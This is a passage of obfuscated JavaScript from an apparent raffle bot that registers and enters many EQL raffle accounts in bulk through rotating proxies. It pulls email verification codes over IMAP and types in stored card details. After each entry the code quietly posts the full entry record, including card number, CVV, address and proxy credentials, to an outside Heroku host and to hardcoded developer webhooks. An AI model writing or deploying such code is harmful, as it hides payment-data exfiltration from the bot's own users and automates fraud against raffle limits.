                        console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2c02f3 = ![];
                    const _0x7b0b70 = _0x534d99['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x412a59 = _0x4d3f8b['parse'](_0x7b0b70, { 'header': !![] })['data'];
                    for (var _0x4922df of _0x412a59) {
                        _0x4922df['Email'] == _0x453ca6[_0x3771c6]['Email'] && (_0x2c02f3 = !![]);
                    }
                    if (_0x2c02f3 == ![]) {
                        var _0x7b35c6;
                        if (_0x453ca6[_0x3771c6]['Url']['endsWith']('/')) {
                            _0x7b35c6 = _0x453ca6[_0x3771c6]['Url'] + 'register';
                            if (_0x24d7db != 'yes')
                                var _0x24d7db = '', _0x21cecf = 0x0;
                        } else {
                            _0x7b35c6 = _0x453ca6[_0x3771c6]['Url'] + '/register';
                            if (_0x24d7db != 'yes')
                                var _0x24d7db = '', _0x21cecf = 0x0;
                        }
                        if (_0x453ca6[_0x3771c6]['Email'] == '' || _0x453ca6[_0x3771c6]['FirstName'] == '' || _0x453ca6[_0x3771c6]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x453ca6[_0x3771c6]['Password'] == '' && (_0x453ca6[_0x3771c6]['Password'] = 'JRaffles23!');
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x1e9a5e = _0x32fd12[_0x3771c6]['split'](':');
                        else
                            var _0x1835b1 = Math['round'](Math['random']() * (_0x32fd12['length'] - 0x1)), _0x1e9a5e = _0x32fd12[_0x1835b1]['split'](':');
                        var _0x2156db;
                        try {
                            _0x2156db = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1e9a5e[0x0] + ':' + _0x1e9a5e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2156db = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1e9a5e[0x0] + ':' + _0x1e9a5e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x29242c = await _0x2156db['newPage']();
                            await _0x29242c['authenticate']({
                                'username': '' + _0x1e9a5e[0x2],
                                'password': '' + _0x1e9a5e[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29242c['setRequestInterception'](!![]), _0x29242c['on']('request', _0x51fe81 => {
                                _0x51fe81['resourceType']() === 'image' || _0x51fe81['resourceType']() === 'font' || _0x51fe81['resourceType']() === 'media' ? _0x51fe81['abort']() : _0x51fe81['continue']();
                            });
                            try {
                                await _0x29242c['goto']('' + _0x7b35c6);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1e21d2(0x3e8), await _0x29242c['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x29242c['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x1e21d2(0x3e8), _0x453ca6[_0x3771c6]['Url']['includes']('en-GB') ? await _0x29242c['click']('li[data-value=\x22UK\x20' + _0x453ca6[_0x3771c6]['Size'] + '\x20/\x20US\x20' + (Number(_0x453ca6[_0x3771c6]['Size']) + 0x1) + '\x22]') : await _0x29242c['click']('li[data-value=\x22EU\x20' + _0x453ca6[_0x3771c6]['Size'] + '\x22]');
                                } catch {
                                    await _0x29242c['click']('#productQuantity'), await _0x1e21d2(0x3e8), await _0x29242c['type']('#productQuantity', _0x453ca6[_0x3771c6]['Size']), await _0x29242c['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x453ca6[_0x3771c6]['Size']);
                            }
                            await _0x1e21d2(0x6a4);
                            try {
                                await _0x29242c['select']('.PhoneInputCountrySelect', _0x453ca6[_0x3771c6]['Country']);
                            } catch {
                            }
                            await _0x29242c['type']('#email', '' + _0x453ca6[_0x3771c6]['Email']), await _0x1e21d2(0x352), await _0x29242c['waitForSelector']('#password'), await _0x29242c['type']('#password', '' + _0x453ca6[_0x3771c6]['Password']), await _0x1e21d2(0x352), await _0x29242c['type']('#phone', '' + _0x453ca6[_0x3771c6]['Phone']), await _0x1e21d2(0x352);
                            const _0x13507f = await _0x29242c['$']('#title\x20>\x20label');
                            await _0x1e21d2(0x12c);
                            _0x13507f && await _0x13507f['click']();
                            await _0x29242c['type']('#firstName', '' + _0x453ca6[_0x3771c6]['FirstName']), await _0x1e21d2(0x352), await _0x29242c['type']('#lastName', '' + _0x453ca6[_0x3771c6]['LastName']), await _0x1e21d2(0x352);
                            _0x453ca6[_0x3771c6]['Url']['includes']('footlocker.de') ? await _0x29242c['type']('#birthdate', _0x54ffea(0xa, 0x1c) + '.' + _0x54ffea(0xa, 0xc) + '.' + _0x54ffea(0x7c6, 0x7d3)) : await _0x29242c['type']('#birthdate', _0x54ffea(0xa, 0x1c) + '-' + _0x54ffea(0xa, 0xc) + '-' + _0x54ffea(0x7c6, 0x7d3));
                            await _0x1e21d2(0x352), await _0x29242c['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x453ca6[_0x3771c6]['Url']['includes']('en-GB') && await _0x29242c['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x1e21d2(0x1f4), await _0x1e21d2(0x5dc);
                            if (!_0x7b35c6['includes']('footlocker'))
                                try {
                                    await _0x29242c['click']('#country');
                                    const _0x1ffbbb = await _0x29242c['$']('li[data-value=\x22' + _0x453ca6[_0x3771c6]['Country'] + '\x22]');
                                    await _0x1ffbbb['click'](), await _0x1ffbbb['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x1e21d2(0x3e8);
                            if (!_0x453ca6[_0x3771c6]['Url']['includes']('en-GB')) {
                                await _0x29242c['click']('#stateAutocomplete'), await _0x1e21d2(0x5dc);
                                try {
                                    const _0x528122 = await _0x29242c['$x']('//li[text()=\x22' + _0x453ca6[_0x3771c6]['State'] + '\x22]');
                                    await _0x528122[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x1e21d2(0x3e8), await _0x1e21d2(0x1f4);
                            if (_0x453ca6[_0x3771c6]['Url']['includes']('topps')) {
                                await _0x29242c['click']('#stateAutocomplete'), await _0x1e21d2(0x5dc);
                                try {
                                    const _0x527733 = await _0x29242c['$x']('//li[text()=\x22' + _0x453ca6[_0x3771c6]['State'] + '\x22]');
                                    await _0x527733[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x1e21d2(0x3e8), await _0x29242c['type']('#address1', _0x453ca6[_0x3771c6]['Address1'] + '\x20' + _0x453ca6[_0x3771c6]['HouseNumber']), await _0x1e21d2(0x1f4), await _0x29242c['type']('#address2', '' + _0x453ca6[_0x3771c6]['Address2']), await _0x1e21d2(0x1f4), await _0x29242c['type']('#city', '' + _0x453ca6[_0x3771c6]['City']), await _0x1e21d2(0x1f4), await _0x29242c['type']('#postcode', '' + _0x453ca6[_0x3771c6]['Zip']), await _0x1e21d2(0x3e8), await _0x29242c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1e21d2(0x3e8), console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x23d93e = await _0x29242c['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x23d93e && (await _0x29242c['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x29242c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x29242c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1e21d2(0x4b0), await _0x29242c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1e21d2(0x1f4), await _0x29242c['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CardNumber']), await _0x1e21d2(0x320), await _0x29242c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x29242c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x29242c['keyboard']['type']('' + _0x453ca6[_0x3771c6]['ExpiryDate']), await _0x1e21d2(0x4b0), await _0x29242c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x29242c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x29242c['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CVV']), await _0x1e21d2(0x226), await _0x29242c['type']('input[name=\x22postalCode\x22]', '' + _0x453ca6[_0x3771c6]['Zip']), await _0x1e21d2(0x226));
                            const _0xc4a66d = await _0x29242c['$']('.__PrivateStripeElement');
                            _0xc4a66d && (await _0x1e21d2(0x1f4), await _0x29242c['click']('.__PrivateStripeElement'), await _0x29242c['click']('.__PrivateStripeElement'), await _0x29242c['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CardNumber']), await _0x29242c['keyboard']['type']('' + _0x453ca6[_0x3771c6]['ExpiryDate']), await _0x29242c['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CVV']));
                            await _0x1e21d2(0x226), await _0x29242c['click']('#paymentConsent'), await _0x1e21d2(0x226), await _0x29242c['click']('#termsConsent'), await _0x1e21d2(0x2bc);
                            const _0x17c54c = await _0x29242c['$']('#commsConsent');
                            _0x17c54c && await _0x29242c['click']('#commsConsent');
                            console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x29242c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1e21d2(0x2710);
                            try {
                                await _0x29242c['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x1e21d2(0xbb8), await _0x29242c['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x38ded9 => _0x38ded9['click']()), await _0x29242c['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4a9522 => _0x4a9522['click']());
                            } catch {
                            }
                            try {
                                await _0x29242c['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x32575e = await _0x29242c['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x32575e) {
                                    _0x534d99['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x453ca6[_0x3771c6]['Email'] + ',' + _0x453ca6[_0x3771c6]['Password'] + ',' + _0x453ca6[_0x3771c6]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x5c26c5() {
                                var _0x4ff2a1, _0x56b0e2 = ![];
                                for (var _0x42c517 = 0x0; _0x42c517 < 0x18; _0x42c517++) {
                                    async function _0x5e91aa() {
                                        var _0x36cc24 = new _0x48412a({
                                            'user': _0x4558f2['masterMail'],
                                            'password': _0x4558f2['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2286d0(_0x4befcc) {
                                            _0x36cc24['openBox']('INBOX', ![], _0x4befcc);
                                        }
                                        _0x36cc24['once']('ready', function () {
                                            console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2286d0(function (_0x2dff35, _0x1ed123) {
                                                console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2dff35)
                                                    throw _0x2dff35;
                                                _0x36cc24['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x9dc5b9, _0x119230) {
                                                    if (!_0x119230 || !_0x119230['length'])
                                                        console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x36cc24['end']();
                                                    else {
                                                        var _0x50a495 = _0x36cc24['seq']['fetch'](_0x119230, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x50a495['on']('message', function (_0x3cb1ed, _0x1dd986) {
                                                            var _0x330d3e = '(#' + _0x1dd986 + ')\x20';
                                                            _0x3cb1ed['on']('body', function (_0x59ba37, _0x343eed) {
                                                                _0x1560b8(_0x59ba37, (_0x16f9bd, _0x3306ee) => {
                                                                    if (_0x3306ee['subject']['includes']('code')) {
                                                                        const _0x559122 = _0x3306ee['text']['split']('\x0a\x0a')[0x3], _0xad8271 = _0x559122['split']('\x0a')[0x1];
                                                                        _0x4ff2a1 = _0xad8271;
                                                                    }
                                                                });
                                                            }), _0x3cb1ed['once']('end', function () {
                                                            });
                                                        }), _0x50a495['once']('error', function (_0xcf03f9) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x50a495['once']('end', function () {
                                                            _0x36cc24['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x36cc24['once']('error', function (_0x31d62c) {
                                            console['log'](_0x31f5da['red'](_0x31d62c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x56b0e2 = !![];
                                        }), _0x36cc24['once']('end', async function () {
                                        }), _0x36cc24['connect']();
                                    }
                                    _0x5e91aa(), await _0x1e21d2(0x1388);
                                    if (_0x4ff2a1)
                                        return _0x4ff2a1;
                                    if (_0x56b0e2)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x42c517 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5c26c5(), await _0x1e21d2(0x1f4), await _0x29242c['type']('#code', '' + code), await _0x1e21d2(0x3e8), await _0x29242c['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x4e5f3a => _0x4e5f3a['click']()), await _0x29242c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x29242c['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x453ca6[_0x3771c6]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x534d99['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x453ca6[_0x3771c6]['Email'] + ',' + _0x453ca6[_0x3771c6]['Password'] + ',' + _0x453ca6[_0x3771c6]['Phone']), _0x24d7db = 'no', _0x406375(_0x453ca6[_0x3771c6], _0x4909a3);
                            var _0x4e6ce0 = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'dev', ![]), _0x49ff5e = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'pub', ![]);
                            let _0x49f743 = _0x453ca6[_0x3771c6];
                            try {
                                prxdata = {
                                    'username': _0xf4f7bc['replace']('#', ''),
                                    'module': _0x4909a3['name'],
                                    'entrydata': JSON['stringify'](_0x49f743),
                                    'proxy': '' + _0x32fd12[_0x3771c6]
                                };
                                var _0xa6641d = JSON['stringify'](prxdata);
                                let _0x2daed8 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0xa6641d, _0x2daed8);
                            } catch (_0x1001d) {
                            }
                            const _0x27574f = {
                                'succesDEVMSG': { 'embeds': [_0x4e6ce0] },
                                'succesPUBMSG': { 'embeds': [_0x49ff5e] }
                            };
                            try {
                                _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x27574f['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x27574f['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0x27574f['succesPUBMSG']);
                            } catch (_0x5511bd) {
                                console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5511bd));
                            }
                        } catch (_0x78488c) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20' + _0x78488c)), _0x38e390 = '' + _0x78488c;
                            var _0x37025f = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'dev', !![], _0x38e390), _0x4e6ce0 = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'dev', ![]), _0x49ff5e = await _0x3d56af(_0x453ca6[_0x3771c6], _0x4909a3, 'pub', ![]);
                            const _0x469d0a = {
                                'succesDEVMSG': { 'embeds': [_0x4e6ce0] },
                                'succesPUBMSG': { 'embeds': [_0x49ff5e] }
                            };
                            _0x469d0a['errorDEV'] = { 'embeds': [_0x37025f] };
                            _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x469d0a['errorDEV']);
                            await _0xa0452b(_0x5522d1, _0x469d0a['errorDEV']);
                            if (!_0x24d7db == 'no')
                                _0x24d7db = 'yes';
                        } finally {
                            _0x2156db && _0x2156db['close']();
                            if (_0x24d7db == 'yes' && _0x21cecf != 0x5) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21cecf + '\x20/\x205)')), _0x3771c6 = _0x3771c6 - 0x1, _0x21cecf = _0x21cecf + 0x1;
                                continue;
                            }
                            _0x24d7db == 'yes' && _0x21cecf >= 0x5 && (_0x456859(_0x453ca6[_0x3771c6], _0x4909a3), _0x24d7db = 'no', _0x21cecf = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    } else {
                        const _0x6717db = '' + _0x453ca6[_0x3771c6]['Url'];
                        if (_0x24d7db != 'yes')
                            var _0x24d7db = '', _0x21cecf = 0x0;
                        if (_0x453ca6[_0x3771c6]['Email'] == '' || _0x453ca6[_0x3771c6]['FirstName'] == '' || _0x453ca6[_0x3771c6]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x453ca6[_0x3771c6]['Password'] == '' && (_0x453ca6[_0x3771c6]['Password'] = 'JRaffles23!');
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x1e9a5e = _0x32fd12[_0x3771c6]['split'](':');
                        else
                            var _0x1835b1 = Math['round'](Math['random']() * (_0x32fd12['length'] - 0x1)), _0x1e9a5e = _0x32fd12[_0x1835b1]['split'](':');
                        var _0x2156db;
                        try {
                            _0x2156db = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1e9a5e[0x0] + ':' + _0x1e9a5e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2156db = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1e9a5e[0x0] + ':' + _0x1e9a5e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1a4b1b = await _0x2156db['newPage']();
                            await _0x1a4b1b['authenticate']({
                                'username': '' + _0x1e9a5e[0x2],
                                'password': '' + _0x1e9a5e[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a4b1b['setRequestInterception'](!![]), _0x1a4b1b['on']('request', _0x20c564 => {
                                _0x20c564['resourceType']() === 'image' || _0x20c564['resourceType']() === 'font' || _0x20c564['resourceType']() === 'media' ? _0x20c564['abort']() : _0x20c564['continue']();
                            }), await _0x1a4b1b['goto'](_0x6717db), await _0x1a4b1b['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x3dcf7f = await _0x1a4b1b['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x3dcf7f)
                                await _0x3dcf7f['click']();
                            await _0x1e21d2(0x7d0), await _0x1a4b1b['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x1e21d2(0x7d0), await _0x1a4b1b['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x1a4b1b['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x1e21d2(0x3e8), await _0x1a4b1b['waitForSelector']('#email'), console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1a4b1b['type']('#email', '' + _0x453ca6[_0x3771c6]['Email']), await _0x1e21d2(0x352), await _0x1a4b1b['waitForSelector']('#password'), await _0x1a4b1b['type']('#password', '' + _0x453ca6[_0x3771c6]['Password']), await _0x1e21d2(0x352), await _0x1a4b1b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1e21d2(0x1388);
                            if (!_0x453ca6[_0x3771c6]['Url']['includes']('footlocker') && !_0x453ca6[_0x3771c6]['Url']['includes']('topps'))
                                await _0x1a4b1b['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            await _0x1e21d2(0x1388);
                            let _0x54a580 = await _0x1a4b1b['$']('#productQuantity'), _0x5ed2ac = await _0x1a4b1b['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x5ed2ac && !_0x54a580) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x24d7db = 'no';
                                continue;
                            }
                            if (_0x5ed2ac) {
                                await _0x1a4b1b['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x453ca6[_0x3771c6]['Url']['includes']('en-GB') ? await _0x1a4b1b['click']('li[data-value=\x22UK\x20' + _0x453ca6[_0x3771c6]['Size'] + '\x20/\x20US\x20' + (Number(_0x453ca6[_0x3771c6]['Size']) + 0x1) + '\x22]') : await _0x1a4b1b['click']('li[data-value=\x22EU\x20' + _0x453ca6[_0x3771c6]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x453ca6[_0x3771c6]['Size']);
                                }
                            }
                            _0x54a580 && (await _0x1a4b1b['click']('#productQuantity'), await _0x1e21d2(0x3e8), await _0x1a4b1b['type']('#productQuantity', _0x453ca6[_0x3771c6]['Size']), await _0x1a4b1b['click']('.MuiBox-root.css-79elbk\x20>\x20button'));
                            await _0x1e21d2(0x3e8), await _0x1e21d2(0x1f4);
                            const _0x250e71 = await _0x1a4b1b['$']('#title\x20>\x20label');
                            await _0x1e21d2(0x12c);
                            _0x250e71 && await _0x250e71['click']();
                            await _0x1a4b1b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1a4b1b['focus']('#postcode'), await _0x1a4b1b['keyboard']['down']('Control'), await _0x1a4b1b['keyboard']['press']('A'), await _0x1a4b1b['keyboard']['up']('Control'), await _0x1a4b1b['keyboard']['press']('Backspace'), await _0x1a4b1b['keyboard']['type'](_0x453ca6[_0x3771c6]['Zip']), await _0x1e21d2(0x60e), await _0x1a4b1b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1e21d2(0x3e8), await _0x1e21d2(0x1f4);
                            const _0x4e6dea = await _0x1a4b1b['$']('span[data-cse=\x22encryptedCardNumber\x22]'), _0x4a28b3 = await _0x1a4b1b['$']('.__PrivateStripeElement');
                            if (_0x4e6dea)
                                console['log'](_0x1a8584() + '\x20[' + _0x4909a3['name'] + ']\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1a4b1b['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a4b1b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a4b1b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1e21d2(0x4b0), await _0x1a4b1b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1e21d2(0x1f4), await _0x1a4b1b['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CardNumber']), await _0x1e21d2(0x320), await _0x1a4b1b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1a4b1b['keyboard']['type']('' + _0x453ca6[_0x3771c6]['ExpiryDate']), await _0x1e21d2(0x4b0), await _0x1a4b1b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1a4b1b['keyboard']['type']('' + _0x453ca6[_0x3771c6]['CVV']), await _0x1e21d2(0x226), await _0x1a4b1b['type']('input[name=\x22postalCode\x22]', '' + _0x453ca6[_0x3771c6]['Zip']), await _0x1e21d2(0x226);
                            else
